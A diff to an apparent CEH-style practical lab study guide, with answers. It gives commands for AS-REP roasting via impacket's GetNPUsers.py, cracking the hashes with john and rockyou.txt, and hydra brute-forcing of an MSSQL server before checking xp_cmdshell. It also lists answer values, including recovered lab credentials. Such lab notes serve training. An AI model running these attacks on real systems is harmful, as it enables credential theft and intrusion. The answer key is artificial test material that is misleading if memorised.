@@ -153,16 +153,18 @@ Answer: 172.30.10.99
 
 **Challenge** 6:
 An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the reports submitted by the IH team which are stored in "C:\Users\Admin\Documents\Anti-DDoS" directory of the EH Workstation-1 and determine the attacker IP which has transmitted more number of packets to the target machine. (Format: NNN.NNN.NN.NNN)
-
+we
 - open report export.txt file
 - find remote ip with higher no of packets
+*** TCP which requires outgoing and ingoing which might be blocked
 
 Answer: 192.168.10.222
 
 **Challenge** 7:
 You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: aNaaN*NNN)
 
-- python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
+****cd (in home likely) then cd impacket/examples is where the GetNPUsers.py will be located.
+- python3 GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
 - copy the hash from output and paste in a txt file a.txt
 - john --wordlist=rockyou.txt ~/a.txt
 
@@ -173,7 +175,7 @@ A client machine under the target domain controller has a misconfigured SQL serv
 
 1.	scan all networks with open port 1433 | nmap -p 1433 192.168.10.0/24 --open
 2.	Try bruteforce all ips with open 1433 port
-3.	hydra -U username.txt -P password.txt 192.168.10.144 mssql
+3.	hydra -U username.txt -P password.txt 192.168.10.144 mssql   ****users.txt and rockyou.txt // hydra -L users.txt -P rockyou.txt 192.168.10.144 mssql
 4.	user = Server_mssrv  and Password = Spidy
 5.	 python3 /Ad-tools/impacket/examples/mssqlclient.py SKILL.com/Server_mssrv:Spidy@192.168.10.144  -port 1433
 6.	Then type this [ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'; ]
